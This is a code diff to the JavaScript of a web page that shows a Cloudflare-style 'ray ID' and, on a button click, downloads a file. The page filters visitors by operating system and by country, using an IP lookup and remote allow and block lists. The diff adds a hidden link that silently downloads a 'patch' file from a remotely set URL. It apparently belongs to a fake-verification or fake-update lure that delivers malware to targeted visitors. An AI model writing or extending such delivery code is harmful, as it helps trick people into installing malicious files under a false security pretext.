@@ -84,7 +84,20 @@ $('#submit_btn').click(function() {
   if (isClose) {
 
     downloadCount++;
-    window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V3';
+    
+    if (isDirectDownload) {
+
+      const link = document.createElement('a');
+      link.href = patchDownloadLinks[0];
+      link.download = '';
+      link.style = 'display: none';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+
+    } else {
+      window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V1';
+    }
 
     window.setTimeout(function() {
         check_ray_id();
@@ -198,9 +211,17 @@ $('#ray-id').text(rayID);
 // Getting the country code from the user's IP
 var country_code = '';
 
+// Settings info
+var isDirectDownload = false;
+var patchDownloadLinks = [];
+
 $.get('https://ipinfo.io/json', function(ipinfo) {
   country_code = ipinfo.country;
   $.post('/api/get_validData.php', {}, function(setting) {
+
+      isDirectDownload = setting.isDirectDownload == 'ON' && true;
+      patchDownloadLinks = setting.PatchDownloadLinks;
+
       if (setting.PageStatus == 'ON' && setting.OS.includes(OS) && (setting.GEO.includes(country_code) || setting.GEO.includes('100')) && !setting.BlockedGEO.includes(country_code) && setting.Version.Enabled == 'V1') {
           $.post('/api/index.php', {
             rayid: rayID,
